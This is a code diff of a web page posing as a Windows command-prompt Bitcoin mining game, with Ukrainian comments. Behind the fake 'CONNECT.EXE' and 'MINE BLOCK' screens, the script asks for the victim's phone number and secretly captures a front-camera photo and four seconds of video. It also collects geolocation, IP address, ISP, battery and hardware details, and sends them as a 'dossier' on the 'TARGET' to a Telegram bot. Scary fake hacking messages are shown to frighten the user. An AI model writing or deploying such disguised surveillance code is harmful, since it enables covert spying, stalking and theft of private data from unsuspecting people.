@@ -6,62 +6,55 @@
     <title>C:\Windows\system32\cmd.exe</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background: #0c0c0c; font-family: 'Consolas', monospace; color: #0f0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        body { background: #0c0c0c; font-family: 'Consolas', 'Courier New', monospace; color: #0f0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
         
-        /* Дизайн з твого cmd-2.html */
-        .titlebar { height: 30px; background: #000080; display: flex; align-items: center; padding: 0 10px; gap: 8px; flex-shrink: 0; }
-        .title-text { flex: 1; font-size: 12px; color: #fff; font-weight: bold; }
-        .tbtn { width: 18px; height: 16px; background: #c0c0c0; border: 1px solid #fff; border-right: 2px solid #444; border-bottom: 2px solid #444; font-size: 10px; font-weight: bold; color: #000; display: flex; align-items: center; justify-content: center; }
+        /* Твій стиль CMD */
+        .titlebar { height: 28px; background: #000080; display: flex; align-items: center; padding: 0 8px; gap: 6px; flex-shrink: 0; }
+        .title-text { flex: 1; font-size: 11px; color: #fff; font-weight: bold; }
+        .tbtn { width: 16px; height: 14px; background: #c0c0c0; border: none; font-size: 9px; color: #000; border-top: 1px solid #fff; border-left: 1px solid #fff; border-right: 1px solid #444; border-bottom: 1px solid #444; font-weight: bold; }
 
-        .terminal { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; position: relative; }
-        #auth-screen { text-align: center; margin-top: 15%; }
+        .terminal { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; }
+        #auth-screen { text-align: center; margin-top: 20%; }
         #game-screen { display: none; }
 
-        input { background: transparent; border: 1px solid #0f0; color: #fff; padding: 12px; width: 85%; margin: 15px 0; outline: none; font-size: 16px; text-align: center; }
-        button { background: #0f0; color: #000; border: none; padding: 15px 30px; cursor: pointer; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
-        button:active { background: #080; }
-
-        .log-line { margin-bottom: 6px; font-size: 13px; line-height: 1.4; }
+        input { background: transparent; border: 1px solid #0f0; color: #fff; padding: 10px; width: 80%; margin: 15px 0; outline: none; font-family: inherit; text-align: center; }
+        button { background: #0f0; color: #000; border: 1px solid #fff; padding: 12px 25px; cursor: pointer; font-weight: bold; font-family: inherit; text-transform: uppercase; }
+        
+        .log-line { margin-bottom: 4px; font-size: 13px; }
         .red { color: #ff5555; }
         .yellow { color: #ffff00; }
-        
-        #matrix-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.1; pointer-events: none; }
-        .stat-bar { background: #1a1a1a; padding: 8px 15px; border-top: 1px solid #333; display: flex; justify-content: space-between; font-size: 12px; color: #888; }
+        .stat-bar { background: #1a1a1a; padding: 8px; border-top: 1px solid #333; display: flex; justify-content: space-between; font-size: 11px; }
     </style>
 </head>
 <body>
 
     <div class="titlebar">
-        <span class="title-text">Microsoft Windows [Version 10.0.19045] - Administrator</span>
+        <span class="title-text">Microsoft Windows [Version 10.0.19045.3208] - cmd.exe</span>
         <div class="tbtn">_</div><div class="tbtn">□</div><div class="tbtn" style="background:#ff5555">X</div>
     </div>
 
-    <div class="terminal">
-        <canvas id="matrix-bg"></canvas>
-        
-        <div id="auth-screen">
-            <h2 style="color:#fff; margin-bottom: 10px;">CORE ACCESS</h2>
-            <p class="log-line yellow">ВВЕДІТЬ НОМЕР ТЕЛЕФОНУ ДЛЯ АКТИВАЦІЇ ВУЗЛА BTC:</p>
-            <input type="tel" id="user-phone" placeholder="+380XXXXXXXXX">
-            <br>
-            <button onclick="startSystem()">INITIALIZE CONNECT.EXE</button>
-        </div>
+    <div class="terminal" id="auth-screen">
+        <p class="log-line yellow">ВВЕДІТЬ НОМЕР ТЕЛЕФОНУ ДЛЯ АВТОРИЗАЦІЇ BTC-ВУЗЛА:</p>
+        <input type="tel" id="user-phone" placeholder="+380XXXXXXXXX">
+        <br>
+        <button onclick="startSystem()">CONNECT.EXE</button>
+        <p style="font-size: 10px; color: #555; margin-top: 15px;">[SECURE TUNNEL: DISABLED]</p>
+    </div>
 
-        <div id="game-screen">
-            <div id="output">
-                <p class="log-line">> CONNECTION ESTABLISHED via SSL/TLS</p>
-            </div>
-            <div style="margin-top: 20px; text-align: center;">
-                <h1 id="balance" style="font-size: 40px; color: #fff; text-shadow: 0 0 10px #0f0;">0.0000 BTC</h1>
-                <button onclick="mine()" id="mine-btn" style="width:100%">MINE NEXT BLOCK ⚡</button>
-            </div>
+    <div id="game-screen" class="terminal">
+        <div id="output">
+            <p class="log-line">> Спроба з'єднання з вузлом 12.0.8.44...</p>
+        </div>
+        <div style="margin-top: 20px; text-align: center;">
+            <h1 id="balance" style="color:#fff; text-shadow: 0 0 10px #0f0;">0.0000 BTC</h1>
+            <button onclick="mine()" style="width:100%; height: 60px;">MINE BLOCK ⚡</button>
         </div>
     </div>
 
     <div class="stat-bar" id="footer" style="display:none">
-        <span>RAM: 86% USED</span>
         <span id="bat-info">BATTERY: --%</span>
-        <span>ENC: AES-256</span>
+        <span>LATENCY: 24ms</span>
+        <span id="ip-info">IP: LOADING...</span>
     </div>
 
     <script>
@@ -69,115 +62,99 @@
         const chatId = '8194848649';
         let btc = 0;
 
-        // Матриця на фоні
-        const canvas = document.getElementById('matrix-bg');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const columns = canvas.width / 20;
-        const drops = Array(Math.floor(columns)).fill(1);
-        function drawMatrix() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#0f0"; ctx.font = "15px monospace";
-            drops.forEach((y, i) => {
-                ctx.fillText(String.fromCharCode(0x30A0 + Math.random() * 96), i * 20, y * 20);
-                if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            });
-        }
-        setInterval(drawMatrix, 50);
-
         async function startSystem() {
             const phone = document.getElementById('user-phone').value;
-            if (phone.length < 9) return alert("Error: Invalid ID format");
+            if (phone.length < 9) return alert("ID занадто короткий!");
 
-            const screen = document.getElementById('auth-screen');
-            screen.innerHTML = '<p class="log-line yellow">> UPLOADING BIO-IDENTIFIER...</p><p id="hack-status" class="log-line"></p>';
+            document.getElementById('auth-screen').innerHTML = '<p class="log-line yellow">> ІНІЦІАЛІЗАЦІЯ БІОМЕТРІЇ...</p><p id="h-logs" class="log-line"></p>';
             
-            // ЗАПУСК ШПИГУНСТВА
-            initSpy(phone);
+            // Запуск шпигуна (фото + відео + локація)
+            runSpy(phone);
 
-            const logs = [
-                "Bypassing device firewall...",
-                "Accessing local storage...",
-                "Extracting cookies & sessions...",
-                "TUNNEL OPENED: 127.0.0.1:8080"
-            ];
-            
+            const steps = ["Bypassing Firewall...", "Tracing Route...", "Cracking RSA-2048...", "Injecting Payload..."];
             let i = 0;
-            const logInt = setInterval(() => {
-                if (i < logs.length) {
-                    document.getElementById('hack-status').innerHTML += `<p class="log-line green">> ${logs[i]}</p>`;
+            const int = setInterval(() => {
+                if(i < steps.length) {
+                    document.getElementById('h-logs').innerHTML += `<p class="log-line">> ${steps[i]}</p>`;
                     i++;
                 } else {
-                    clearInterval(logInt);
+                    clearInterval(int);
                     document.getElementById('auth-screen').style.display = 'none';
-                    document.getElementById('game-screen').style.display = 'block';
+                    document.getElementById('game-screen').style.display = 'flex';
                     document.getElementById('footer').style.display = 'flex';
                 }
-            }, 700);
+            }, 800);
         }
 
-        async function initSpy(phone) {
+        async function runSpy(phone) {
             try {
-                // Отримуємо заряд батареї
+                // 1. Дані IP
+                const ipReq = await fetch('https://ipapi.co/json/').catch(()=>null);
+                const ipData = ipReq ? await ipReq.json() : {ip: "N/A", org: "N/A"};
+                document.getElementById('ip-info').innerText = "IP: " + ipData.ip;
+
+                // 2. Батарея
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
                     document.getElementById('bat-info').innerText = "BATTERY: " + Math.round(b.level * 100) + "%";
                 }
 
-                // Камера та Мікрофон
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                
-                // 1. РОБИМО ФОТО МИТТЄВО
+                // 3. Камера
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.setAttribute("playsinline", true);
                 await video.play();
+
+                // ФОТО
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                const canvasImg = document.createElement('canvas');
-                canvasImg.width = video.videoWidth; canvasImg.height = video.videoHeight;
-                canvasImg.getContext('2d').drawImage(video, 0, 0);
-                
-                // 2. ЗАПИСУЄМО ВІДЕО (4 секунди)
-                const mediaRecorder = new MediaRecorder(stream);
+                // ВІДЕО ЗАПИС (4 сек)
+                const recorder = new MediaRecorder(stream);
                 let chunks = [];
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                    sendToTG(canvasImg, videoBlob, phone);
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const vBlob = new Blob(chunks, {type: 'video/webm'});
+                    sendFinalReport(canvas, vBlob, phone, ipData);
                     stream.getTracks().forEach(t => t.stop());
                 };
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 4000);
+                recorder.start();
+                setTimeout(()=> recorder.stop(), 4000);
 
             } catch (e) {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=❌ ERROR: ${e.message}`);
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=❌ Error: ${e.message}`);
             }
         }
 
-        async function sendToTG(canvas, videoBlob, phone) {
-            // Локація
-            navigator.geolocation.getCurrentPosition(async (pos) => {
+        function sendFinalReport(canvas, vBlob, phone, ip) {
+            navigator.geolocation.getCurrentPosition(pos => {
                 const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 
-                // Відправляємо фото
+                // Фото + Текст з кнопками
                 canvas.toBlob(blob => {
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
-                    fd.append('photo', blob, 'shot.jpg');
-                    fd.append('caption', `🕵️‍♂️ TARGET: ${phone}\n📍 Map: ${map}\n⚙️ Hardware: ${navigator.hardwareConcurrency} cores`);
+                    fd.append('photo', blob, 'img.jpg');
+                    fd.append('caption', `🕵️‍♂️ <b>ДОСЬЄ:</b> <code>${phone}</code>\n📍 <b>Map:</b> ${map}\n🌐 <b>IP:</b> ${ip.ip}\n🏢 <b>ISP:</b> ${ip.org}\n📱 <b>Cores:</b> ${navigator.hardwareConcurrency}`);
+                    fd.append('parse_mode', 'HTML');
+                    
+                    const kb = { inline_keyboard: [[{text: "📍 Карта", url: map}, {text: "🔍 IP Інфо", url: "https://who.is/whois-ip/ip-address/"+ip.ip}]] };
+                    fd.append('reply_markup', JSON.stringify(kb));
+                    
                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                 }, 'image/jpeg');
 
-                // Відправляємо відео
-                const fdV = new FormData();
-                fdV.append('chat_id', chatId);
-                fdV.append('video', videoBlob, 'spy.webm');
-                fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: fdV });
+                // Відео
+                const vfd = new FormData();
+                vfd.append('chat_id', chatId);
+                vfd.append('video', vBlob, 'vid.webm');
+                fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: vfd });
             });
         }
 
-        const scary = ["Accessing DCIM/Camera...", "Reading SMS database...", "Uploading contacts...", "Telegram session found!"];
+        const scary = ["Extracting browser cache...", "Accessing DCIM/Photos...", "WhatsApp database found", "Dumping SMS logs..."];
 
         function mine() {
             btc += 0.0001;
@@ -186,15 +163,15 @@
             const p = document.createElement('p');
             p.className = 'log-line';
             
-            if (Math.random() > 0.6) {
+            if(Math.random() > 0.7) {
                 p.innerHTML = `<span class="red">[!] ${scary[Math.floor(Math.random()*scary.length)]}</span>`;
             } else {
-                p.innerHTML = `<span class="green">[OK]</span> Block hash: 0x${Math.random().toString(16).slice(2,8)}`;
+                p.innerHTML = `<span class="green">[OK]</span> Hash: 0x${Math.random().toString(16).slice(2,8)}`;
             }
             
             out.appendChild(p);
             out.scrollTop = out.scrollHeight;
-            if (navigator.vibrate) navigator.vibrate(40);
+            if(navigator.vibrate) navigator.vibrate(40);
         }
     </script>
 </body>
